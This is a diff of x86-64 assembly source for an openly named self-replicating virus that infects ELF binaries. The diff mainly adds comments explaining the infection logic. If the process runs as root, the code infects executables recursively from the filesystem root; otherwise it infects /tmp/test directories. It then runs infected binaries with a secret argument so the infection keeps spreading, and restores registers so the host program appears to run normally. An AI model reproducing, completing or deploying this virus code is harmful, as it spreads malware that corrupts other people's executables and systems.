@@ -49,29 +49,34 @@ _start:
 	push r13 ; +88
 	push r14 ; +96
 	push r15 ; +104
-	cmp QWORD [rsp + 128], 3
+;;;;;;;;;;;;;;;;;;;;;
+; To know if we need to execute the binary code, we pass a code in parameter.
+; So we need to check parameters to know what to do
+; Arguments can be on stack or on registers, depending of the compilator so:
+	cmp QWORD [rsp + 128], 3 ; check if argc on the stack is equal 3
 	je _alternative_start
-	cmp QWORD [rsp + 64], 3
+	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
 	je _alternative_start_by_registers
+
+; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
+; software with a too long execution.
 _continue_normaly:
-;	lea rax, [rel _o_entry]
-;	cmp QWORD [rax], 0
-;	jne _jmp_to_o_entry
-;;;;;;;;;;;;;;;;;;;;;;
-;	push 0x000000000000002f ; /
 	mov rax, 0
 	push rax
 	push rax
 	lea r10, [rel _o_entry]
-	cmp QWORD [r10], 0
+; Here we check if their is a o_entry address. If so, we are in an infected binary,
+; so we just infect /tmp/test(2), and execute the code normally.
+; Else, we test for the privilege we have, and try to infect from / if we can
+	cmp QWORD [r10], 0 ; compare _o_entry with 0
 	jne _infect_tmp_test
 	mov rax, 107
-	syscall
-	cmp rax, 0
+	syscall ; We call geteuid
+	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
 	jne _infect_tmp_test
 	mov rax, 0
 	jmp _push_it
-_infect_tmp_test:
+_infect_tmp_test: ; if geteuid don't returned 0, we can't know what right we have. So we just infect /tmp/test(2)
 	mov rax, 0x747365742f706d74 ; tmp/test
 ;	mov rax, 0x006e69622f706d74 ; tmp/bin
 _push_it:
@@ -79,17 +84,17 @@ _push_it:
 	mov rdi, rsp
 	mov rsi, rsp
 	add rsi, 16
-	mov rax, 1
+	mov rax, 1 ; Here we said to our function: Go in recursive infect!
 	push rax
 	push rsi
 	push rdi
 	call _read_dir
-	lea r10, [rel _o_entry]
-	cmp QWORD [r10], 0
+	cmp QWORD [rsp + 24], 0 ; if the path is empty, we infected from '/', so we don't need to reinfect
 	je _jmp_end
-	mov BYTE [rsp + 24], 0x32
+	mov BYTE [rsp + 32], 0x32 ; add the '2' at the end of the path string
 	call _read_dir
 _jmp_end:
+; restore the stack
 	pop rdi
 	pop rdi
 	pop rdi
@@ -104,15 +109,19 @@ _force_exit:
 	mov rax, 60 ; exit syscall number
 	syscall
 
+; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
+; if this is an infect only execution (we just run the infection, and then exit), of if we execute
+; the binary after.
+; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
+; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)
 _alternative_start:
-	mov r10, QWORD [rsp + 144]
-	lea r11, [rel _verif]
-	mov r11, QWORD [r11]
-	cmp QWORD [r10], r11
+	mov r10, QWORD [rsp + 144] ; We take argv[1].
+	lea r11, [rel _verif] ; relative address of _verif
+	mov r11, QWORD [r11] ; dereferencing
+	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
 	jne _continue_normaly
-	mov rsi, QWORD [rsp + 152]
-	mov rdi, QWORD [rsp + 136]
-	mov rax, 0
+	mov rsi, QWORD [rsp + 152] ; take the argv[2]
+	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
 	push rax
 	push rsi
 	push rax
@@ -120,18 +129,20 @@ _alternative_start:
 	pop rdi
 	pop rdi
 	pop rdi
-	lea rax, [rel _force_exit]
+	lea rax, [rel _force_exit] ; then exit
 
+; In this other alternative start, the arguments are received by registers. We pushed the registers to
+; don't corrupt the normal execution, so we will find our arguments on the stack.
 _alternative_start_by_registers:
-	mov r10, QWORD [rsp + 72]
-	mov r10, QWORD [r10 + 8]
-	lea r11, [rel _verif]
-	mov r11, QWORD [r11]
-	cmp QWORD [r10], r11
+	mov r10, QWORD [rsp + 72] ; here we take argv
+	mov r10, QWORD [r10 + 8] ; argv is an array, so we take the index 1 (argv[1]).
+	lea r11, [rel _verif] ; relative address of _verif
+	mov r11, QWORD [r11] ; dereferencing
+	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
 	jne _continue_normaly
-	mov rsi, QWORD [rsp + 72]
-	mov rsi, QWORD [rsi + 16]
-	mov rax, 0
+	mov rsi, QWORD [rsp + 72] ; take argv
+	mov rsi, QWORD [rsi + 16] ; take argv[2]
+	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
 	push rax
 	push rsi
 	push rax
@@ -139,19 +150,10 @@ _alternative_start_by_registers:
 	pop rdi
 	pop rdi
 	pop rdi
-	lea rax, [rel _force_exit]
-
-;_munmap_thread:
-;	mov rax, 11
-;	mov rdi, rsp
-;	add rdi, 16
-;	sub rdi, STACK_SIZE
-;	mov rsi, STACK_SIZE
-;	syscall
-;	mov rdi, 11
-;	jmp _force_exit
+	lea rax, [rel _force_exit] ; then exit
 
 _jmp_to_o_entry:
+; Restore the registers, to execute the binary like if we just never do enything on stack/registers
 	pop r15
 	pop r14
 	pop r13
@@ -184,10 +186,17 @@ _strlen_end:
 	leave
 	ret
 
-_read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
-;	push rbp
-;	mov rbp, rsp
-;	sub rsp, 368
+
+; Here is our principal function:
+; She will read the directory passed in parameter, and run infection in this directory.
+; But the principe is a little bit more complexe:
+; When this function find a binary in a directory, she infect this binary, and then exec it in a
+; fork, with the _verif argument, if the bool recursif is set.
+; If recursif is not set, it infect all binary in her given directory, and do not infect in
+; recursif.
+; So our main exec will run the recursif mode, infect only 1 binary per directory, et execute them.
+; Then all the binary infected how will be executed will infect all binaries on their current directory.
+_read_dir: ; void read_dir(bool recursif, char *actual_directory, char *path_of_dir)
 	enter 392, 0
 	; rsp + 0: dir struct
 	; rsp + 280: virus size
@@ -222,19 +231,6 @@ _read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
 	add QWORD [rsp + 336], r10
 	add QWORD [rsp + 336], 2
 	mov QWORD [rsp + 352], 0
-;	mov rax, 9
-;	mov rdi, 0
-;	mov rsi, 4096
-;	mov rdx, 3
-;	mov r10, 34
-;	mov r8, -1
-;	mov r9, 0
-;	syscall
-;	cmp rax, 0
-;	jle _end_ret
-;	mov QWORD [rsp + 360], rax
-;	add QWORD [rsp + 360], 4096
-;	sub QWORD [rsp + 360], 8
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; we need a dynamic buffer to store our concatenation, but we can't touch rsp,
 ; to don't corrupt the datas offset is stack (if we sub 8 to rsp, rsp + 0 become rsp + 8)
@@ -309,8 +305,6 @@ _calculate_virus_size:
 	mov QWORD [rsp + 280], r10 ; virus size = r10
 
 _open_dir:
-;	push 0x0000000000002f2e ; push "./"
-;	mov rdi, QWORD [rsp + 312] ; mov the stack address on rdi, addres of our string
 	mov rdi, rsp
 	mov r10, QWORD [rsp + 336]
 	sub rdi, r10
@@ -324,7 +318,6 @@ _open_dir:
 	add QWORD [rsp], 8
 	syscall ; open
 	add rsp, QWORD [rsp]
-;	pop rdi ; we pushed, so we pop
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
 	jle _close_dir
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
@@ -366,11 +359,11 @@ _read_data:
 	xor r12, r12 ; r12 = 0
 	mov r12b, BYTE [rsi + 18] 
 	cmp r12, 8
-	jne _continue
+	jne _continue ; if it's not a regular file, just continue
 	cmp QWORD [rsp + 368], 1
-	jne _treat_normally
+	jne _treat_normally ; check if we already infected a binary. if so, we need to know if we need to infect the others binaries
 	cmp QWORD [rsp + 360], 1
-	je _continue
+	je _continue ; check if we need to infect all binaries. We the recursif is not set, we infect all binaries
 ; now we call _treat_file, with our current file.
 _treat_normally:
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
@@ -399,7 +392,7 @@ _call_treat_file:
 	jmp _continue
 
 _test_bool:
-	cmp QWORD [rsp + 368], 1
+	cmp QWORD [rsp + 368], 1 ; check if we need to infect in recursiv
 	jne _continue
 
 _recursiv_infect:
@@ -419,7 +412,7 @@ _recursiv_infect:
 	sub rsp, 8
 	mov QWORD [rsp], r10
 	add QWORD [rsp], 8
-	mov rax, 1
+	mov rax, 1 ; continue to infect in recursiv mode
 	push rax
 	push rsi
 	push rdi
@@ -451,6 +444,7 @@ _end_ret:
 	leave
 	ret
 
+; Here is our verif code
 _verif:
 	dq 0x1122334455667788
 	db 0
